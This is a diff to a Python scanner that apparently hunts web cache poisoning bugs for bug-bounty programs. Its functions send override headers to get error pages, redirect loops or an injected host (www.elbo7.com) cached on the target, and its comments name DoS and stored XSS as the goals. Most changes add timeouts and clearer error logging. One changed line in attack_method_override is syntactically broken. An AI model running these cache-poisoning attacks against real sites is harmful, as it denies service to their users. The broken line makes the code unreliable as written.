@@ -262,7 +262,7 @@ def get_unkeyed_input(url, is_cacheable_data, test_params=[], test_headers={}):
 #
 # tries to override the path and get the page cached, essentially denying service to the specified page.
 #
-def attack_path_override(url, initial_response=None):
+def attack_path_override(url, initial_response=None, timeout=20.0):
     exploitable_headers = []
     is_vulnerable = False
 
@@ -274,7 +274,7 @@ def attack_path_override(url, initial_response=None):
 
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                       "accept":"*/*, text/stuff",
                                                       "origin":"https://www.example.com"})
     else:
@@ -288,7 +288,7 @@ def attack_path_override(url, initial_response=None):
     for header in headers:
         #generate a cache buster and send the request with the header
         cache_buster = "cache" + gen_rand_str(8)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"/404" + gen_rand_str(16)})
@@ -302,7 +302,7 @@ def attack_path_override(url, initial_response=None):
             if response.status_code == 404:
                 is_probable = True
 
-            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+            response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
             if response.status_code != 200:
@@ -314,13 +314,13 @@ def attack_path_override(url, initial_response=None):
 # tries to make it look like the request is done through http when in fact it's done through https, causing the server to 
 # cache a redirect 301/302 response, which causes an infinite loop of redirects or an error page, essentially DoS.
 #
-def attack_protocol_override(url, initial_response=None):
+def attack_protocol_override(url, initial_response=None, timeout=20.0):
     exploitable_headers = []
     is_vulnerable = False
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                       "accept":"*/*, text/stuff",
                                                       "origin":"https://www.example.com"})
     else:
@@ -334,14 +334,14 @@ def attack_protocol_override(url, initial_response=None):
     for header in headers:
         #generate a cache buster and send the request with the header
         cache_buster = "cache" + gen_rand_str(8)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"http"})
         #if we get a redirect, we remove the header and resend the request
         if response.is_redirect:
             time.sleep(0.5)
-            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+            response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
             if response.is_redirect:
@@ -354,13 +354,13 @@ def attack_protocol_override(url, initial_response=None):
 # Does the same thing as protocol override, makes the server think it's requesting port 80 which would
 # return a 301/302 redirect to port 443, if cached causes infinite redirect loop, essentially DoS.
 #
-def attack_port_override(url, initial_response=None):
+def attack_port_override(url, initial_response=None, timeout=20.0):
     exploitable_headers = []
     is_vulnerable = False
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                       "accept":"*/*, text/stuff",
                                                       "origin":"https://www.example.com"})
     else:
@@ -374,14 +374,14 @@ def attack_port_override(url, initial_response=None):
     for header in headers:
         #generate a cache buster and send the request with the header
         cache_buster = "cache" + gen_rand_str(8)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"80"})
         #if we get a non 200 response code, we remove the header and resend the request
         if response.status_code != 200:
             time.sleep(0.5)
-            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+            response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
             if response.status_code != 200:
@@ -393,13 +393,13 @@ def attack_port_override(url, initial_response=None):
 #
 # Overrides the request method to HEAD in order to get an empty response cached, DoS.
 #
-def attack_method_override(url, initial_response=None):
+def attack_method_override(url, initial_response=None, timeout=20.0):
     exploitable_headers = []
     is_vulnerable = False
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        initial_response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        initial_response = httpx.request("GET", url timeout=timeout,, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                       "accept":"*/*, text/stuff",
                                                       "origin":"https://www.example.com"})
 
@@ -411,14 +411,14 @@ def attack_method_override(url, initial_response=None):
     for header in headers:
         #generate a cache buster and send the request with the header
         cache_buster = "cache" + gen_rand_str(8)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"HEAD"})
         #if we get an empty response, we remove the header and resend the request
         if len(response.text) <= 2 and len(response.text) < len(initial_response.text):
             time.sleep(0.5)
-            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+            response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
             if len(response.text) <= 2 and len(response.text) < len(initial_response.text):
@@ -431,13 +431,13 @@ def attack_method_override(url, initial_response=None):
 # This attack uses an injected host header to change the redirect location of a 30X status code
 # can take an extra header and value to cause a redirect on an otherwise 200 ok page
 #
-def attack_permenant_redirect(url, redirect_causing_header="X-placeholder", redirect_causing_header_value="value"):
+def attack_permenant_redirect(url, initial_response=None, timeout=20.0, redirect_causing_header="X-placeholder", redirect_causing_header_value="value"):
     exploitable_headers = []
     is_vulnerable = False
 
     #if the page does not return a 30X redirect there's nothing to do
     cache_buster = "cache" + gen_rand_str(8)
-    response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+    response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                         "accept":"*/*, text/" + cache_buster,
                                                                                         "origin":"https://" + cache_buster + ".example.com",
                                                                                         redirect_causing_header:redirect_causing_header_value})
@@ -450,7 +450,7 @@ def attack_permenant_redirect(url, redirect_causing_header="X-placeholder", redi
     for header in headers:
         #generate a cache buster and send the request with the header
         cache_buster = "cache" + gen_rand_str(8)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             redirect_causing_header:redirect_causing_header_value,
@@ -458,7 +458,7 @@ def attack_permenant_redirect(url, redirect_causing_header="X-placeholder", redi
         #if the location header contains our domain, we succeeded, test if cached or not
         if "location" in response.headers and "elbo7" in response.headers["location"]:
             time.sleep(0.5)
-            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+            response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
             if "location" in response.headers and "elbo7" in response.headers["location"]:
@@ -470,13 +470,13 @@ def attack_permenant_redirect(url, redirect_causing_header="X-placeholder", redi
 #
 # Tries to induce a 403 by using a banned user agent
 #
-def attack_evil_user_agent(url, initial_response=None):
+def attack_evil_user_agent(url, initial_response=None, timeout=20.0):
     exploitable_values = []
     is_vulnerable = False
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                       "accept":"*/*, text/stuff",
                                                       "origin":"https://www.example.com"})
     else:
@@ -490,13 +490,13 @@ def attack_evil_user_agent(url, initial_response=None):
     for value in values:
         #generate a cache buster and send the request with the header
         cache_buster = "cache" + gen_rand_str(8)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":value,
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":value,
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
         #if we get a 403, repeat to see if cached
         if response.status_code != 200:
             time.sleep(0.5)
-            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+            response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
             if response.status_code != 200:
@@ -508,13 +508,13 @@ def attack_evil_user_agent(url, initial_response=None):
 #
 # attack has multiple implications, from denial of service to stored xss.
 #
-def attack_host_override(url, initial_response=None):
+def attack_host_override(url, initial_response=None, timeout=20.0):
     exploitable_headers = []
     is_vulnerable = False
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                       "accept":"*/*, text/stuff",
                                                       "origin":"https://www.example.com"})
     else:
@@ -528,14 +528,14 @@ def attack_host_override(url, initial_response=None):
     for header in headers:
         #generate a cache buster and send the request with the header
         cache_buster = "cache" + gen_rand_str(8)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"www.elbo7.com"})
         #if we get reflection in the response body remove header and try again
         if "elbo7" in response.text:
             time.sleep(0.5)
-            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+            response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
             if "elbo7" in response.text:
@@ -547,13 +547,13 @@ def attack_host_override(url, initial_response=None):
 #
 # Partially override host header, add the wrong port -> DoS
 #
-def attack_port_dos(url, initial_response=None):
+def attack_port_dos(url, initial_response=None, timeout=20.0):
     exploitable_headers = []
     is_vulnerable = False
     
     #if the response is not a redirect there's nothing to do
     if initial_response == None:
-        initial_response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        initial_response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                       "accept":"*/*, text/stuff",
                                                       "origin":"https://www.example.com"})
 
@@ -565,14 +565,14 @@ def attack_port_dos(url, initial_response=None):
     for header in headers:
         #generate a cache buster and send the request with the header
         cache_buster = "cache" + gen_rand_str(8)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:initial_response.request.headers["host"] + ":1337"})
         #if we get reflection in the response body remove header and try again
         if "location" in response.headers and ":1337" in response.headers["location"]:
             time.sleep(0.5)
-            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+            response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
             if "location" in response.headers and ":1337" in response.headers["location"]:
@@ -600,7 +600,7 @@ def modified_normalize_and_validate(headers, _parsed=False):
         new_headers.append((raw_name, name, value))
     return Headers(new_headers)
 
-def attack_illegal_header(url, initial_response=None):
+def attack_illegal_header(url, initial_response=None, timeout=20.0):
     #patch the validation function in httpx to allow illegal headers
     normalize_and_validate_backup = h11._headers.normalize_and_validate
     h11._headers.normalize_and_validate = modified_normalize_and_validate
@@ -609,7 +609,7 @@ def attack_illegal_header(url, initial_response=None):
     
     #if the page does not return a 200 ok/redirect there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                       "accept":"*/*, text/stuff",
                                                       "origin":"https://www.example.com"})
     else:
@@ -621,14 +621,14 @@ def attack_illegal_header(url, initial_response=None):
 
     #generate a cache buster and send the request with the header
     cache_buster = "cache" + gen_rand_str(8)
-    response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+    response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                         "accept":"*/*, text/" + cache_buster,
                                                                                         "origin":"https://" + cache_buster + ".example.com",
                                                                                         "]":"x"})
     #if we get a non 200 response code, we remove the header and resend the request
     if response.status_code not in [200, 301, 302, 303, 307, 308]:
         time.sleep(0.5)
-        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                         "accept":"*/*, text/" + cache_buster,
                                                                                         "origin":"https://" + cache_buster + ".example.com"})
         if response.status_code not in [200, 301, 302, 303, 307, 308]:
@@ -687,7 +687,7 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
             logging.critical(termcolor.colored("[!]: [POSSIBLE DOS ATTACK]: path override with uncacheable error page through: {}".format(attack_result[1]), "yellow"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred in attack_path_override: " + str(e), "red"))
         pass
     
     try:
@@ -698,13 +698,13 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: [DOS ATTACK]: protocol override redirect loop through: {}".format(attack_result[1]), "green"))
             #if we can force a redirect let's see if we can influence it
             for redirect_causing_header in attack_result[1]:
-                secondary_attack_result = attack_permenant_redirect(url, redirect_causing_header, "http")
+                secondary_attack_result = attack_permenant_redirect(url, initial_response, 20.0, redirect_causing_header, "http")
                 if secondary_attack_result[0]:
                     ret_val.rdr_permenant_redirect = secondary_attack_result
                     logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
                     logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: ['{}'] and {}".format(redirect_causing_header, secondary_attack_result[1]), "green"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred in attack_protocol_override: " + str(e), "red"))
         pass
 
     try:
@@ -714,13 +714,13 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: [DOS ATTACK]: port override redirect loop through: {}".format(attack_result[1]), "green"))
             #if we can force a redirect let's see if we can influence it
             for redirect_causing_header in attack_result[1]:
-                secondary_attack_result = attack_permenant_redirect(url, redirect_causing_header, "80")
+                secondary_attack_result = attack_permenant_redirect(url, initial_response, 20.0, redirect_causing_header, "80")
                 if secondary_attack_result[0]:
                     ret_val.rdr_permenant_redirect = secondary_attack_result
                     logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
                     logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: [\"{}\"] and {}".format(redirect_causing_header, secondary_attack_result[1]), "green"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred attack_port_override: " + str(e), "red"))
         pass
     
     try:
@@ -730,7 +730,7 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
             logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: {}".format(attack_result[1]), "green"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred in attack_permenant_redirect: " + str(e), "red"))
         pass
 
     try:
@@ -740,7 +740,7 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
             logging.critical(termcolor.colored("[!]: [DOS ATTACK]: method override through: {}".format(attack_result[1]), "green"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred in attack_method_override: " + str(e), "red"))
         pass
 
     try:
@@ -750,7 +750,7 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
             logging.critical(termcolor.colored("[!]: [DOS ATTACK]: evil user-agent attack through: {}".format(attack_result[1]), "green"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred attack_evil_user_agent: " + str(e), "red"))
         pass
 
     try:
@@ -760,7 +760,7 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
             logging.critical(termcolor.colored("[!]: [DOS/XSS ATTACK]: host override through: {}".format(attack_result[1]), "green"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred in attack_host_override: " + str(e), "red"))
         pass
 
     try:
@@ -770,7 +770,7 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
             logging.critical(termcolor.colored("[!]: [DOS ATTACK]: port DoS through: {}".format(attack_result[1]), "green"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred in attack_port_dos: " + str(e), "red"))
         pass
 
     try:
@@ -780,7 +780,7 @@ def specific_attacks(url, program_name):
             logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
             logging.critical(termcolor.colored("[!]: [DOS ATTACK]: illegal header attack through: \"{}\"".format(attack_result[1]), "green"))
     except Exception as e:
-        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
+        logging.error(termcolor.colored("[E]: Exception ocurred in attack_illegal_header: " + str(e), "red"))
         pass
 
     return ret_val
@@ -800,6 +800,9 @@ def header_bin_search(url, header_list):
                                                               "accept":"*/*, text/stuff",
                                                               "origin":"https://www.example.com"})
     except:
+        return []
+
+    if not (initial_response.is_success or initial_response.is_redirect):
         return []
   
     header_group_list = [header_list]
@@ -825,6 +828,10 @@ def header_bin_search(url, header_list):
             except:
                 header_group_list[i] = None
                 continue
+            
+            #rate limiting causes false positives
+            if (response.status_code == 429):
+                return []
 
             if (response.status_code != initial_response.status_code) or (canary in response.text) or any(canary in value for value in response.headers.values()):
                 pass
